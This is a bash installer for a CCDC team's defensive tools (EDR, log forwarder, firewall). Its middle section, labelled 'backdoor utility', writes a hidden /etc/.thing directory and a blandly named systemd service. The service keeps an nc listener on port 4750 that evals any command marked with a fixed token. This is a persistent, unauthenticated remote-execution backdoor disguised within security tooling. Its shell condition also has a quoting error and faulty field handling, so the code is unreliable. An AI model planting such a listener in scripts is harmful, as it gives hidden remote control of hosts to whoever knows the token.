#This installer is designed to be used in conjunction with the EKU-CCDC github (https://github.com/ravesec/eku-ccdc)
#This can be run on any linux machine and it will begin installing the custom tools involved in the competition

#!/bin/bash
echo "Installing dependencies"
yum install -y nc iptables nft inotify-tools
apt install -y nc iptables nft inotify-tools
repo_root=$(git rev-parse --show-toplevel)
echo "Installing Gemini EDR"
bash $repo_root/scripts/linux/Gemini/install.sh
echo "Installing Manticore Listener"
echo "NOT IMPLEMENTED" #when manticore is stable on old linux versions, execute the listener install
echo "Installing Arbiter Log Forwarder"
bash $repo_root/scripts/linux/Arbiter/forwarderInstall.sh
echo "Installing Inferno Firewall"
bash $repo_root/scripts/linux/firewall/install.sh
echo "Installing backdoor utility"
mkdir /etc/.thing
cat << EOFA > /etc/systemd/system/hi.service
[Unit]
Description=Thing for things

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/bin/bash -c '/etc/.thing/hi.listener'
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFA
cat << EOFA > /etc/.thing/hi.listener
while true; do
	cmd=$(nc -l -p 4750)
	IFS="###" read -ra cmdSplit <<< "$cmd"
	if [[ ${#cmdSplit} -eq 4 ]] && [[ "${cmdSplit[0]} -eq "idk" ]]; then
		eval "${cmdSplit[3]}"
	fi
done
EOFA
systemctl daemon-reload
systemctl enable hi
systemctl start hi
echo "Installation complete."
echo "Don't forget to edit the file located at /etc/Gemini/gemini.conf before starting Gemini."
echo "It can brick your service if you don't"
echo "When it's edited, run the following two commands:"
echo "systemctl enable gemini.service"
echo "systemctl start gemini.service"